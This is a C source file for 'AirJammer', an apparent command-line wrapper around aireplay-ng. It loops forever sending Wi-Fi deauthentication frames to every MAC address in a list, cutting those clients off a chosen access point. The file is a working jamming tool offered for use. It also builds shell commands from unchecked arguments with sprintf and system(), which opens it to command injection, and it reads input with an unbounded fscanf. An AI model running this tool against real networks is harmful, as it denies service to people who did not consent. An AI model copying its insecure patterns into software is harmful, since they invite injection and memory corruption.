/**CFile***********************************************************************

  FileName    [airjammer.c]

  PackageName [Aircrack-CLI]

  Synopsis    [Aircrack Command Line Interface - AirJammer]

  Description [Command Line Interface for Aircrack-ng 
  (credits to Thomas d'Otreppe <tdotreppe@aircrack-ng.org>)]

  Author      [ynad]

  License     [GPLv2, see LICENSE.md]
  
  Revision    [beta-03, 2013-11-21]

******************************************************************************/


#ifndef __linux__
#error Compatible with Linux only!
#endif

#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <errno.h>

//general library header
#include "lib.h"

//prototypes
static char **readFile(char *, int *);

//error variable
//xextern int errno;


int main (int argc, char *argv[])
{
	int i, dim;
	char death[]={"aireplay-ng --deauth 1 -a"}, **maclist, cmd[BUFF];

	if (argc < 4) {
		fprintf(stderr, "Argument error. Syntax:\n\t%s [BSSID] [MONITOR-IF] [MAC-LIST-FILE]\n", argv[0]);
		return (EXIT_FAILURE);
	}
	//check execution permissions
    if (getgid() != 0) {
        fprintf(stderr, "Run it as root!\n");
		return (EXIT_FAILURE);
    }
	dim = 0;
	//reading MACs list
	if ((maclist = readFile(argv[3], &dim)) == NULL)
		return (EXIT_FAILURE);

	while (TRUE) {
		for (i=0; i<dim; i++) {
			sprintf(cmd, "%s %s -c %s %s --ignore-negative-one", death, argv[1], maclist[i], argv[2]);
			fprintf(stdout, "\tDeAuth n.%d:\n", i+1);
			system(cmd);
		}
	}
	freeMem(maclist, dim);

	return (EXIT_SUCCESS);
}


static char **readFile(char *source, int *dim)
{
	FILE *fp;
	char cmd[BUFF], **maclist;
	int i;

	//clear error value
	errno = 0;

	//opening file containing MAC list
	if ((fp = fopen(source, "r")) == NULL) {
		fprintf(stderr, "Error opening file \"%s\": %s.\n", source, strerror(errno));
		return NULL;
	}
	//checking list lenght
	while (fgets(cmd, BUFF, fp) != NULL)
		(*dim)++;
	rewind(fp);
	if ((maclist = (char**)malloc((*dim) * sizeof(char*))) == NULL) {
		fprintf(stderr, "Error allocating MAC list (dim. %d): %s.\n", *dim, strerror(errno));
		return NULL;
	}
	//reading file
	for (i=0; i<*dim; i++) {
		fscanf(fp, "%s", cmd);
		if ((maclist[i] = strdup(cmd)) == NULL) {
			fprintf(stderr, "Error allocating MAC address (pos. %d): %s.\n", i, strerror(errno));
			freeMem(maclist, i);
			return NULL;
		}
	}
	return maclist;
}

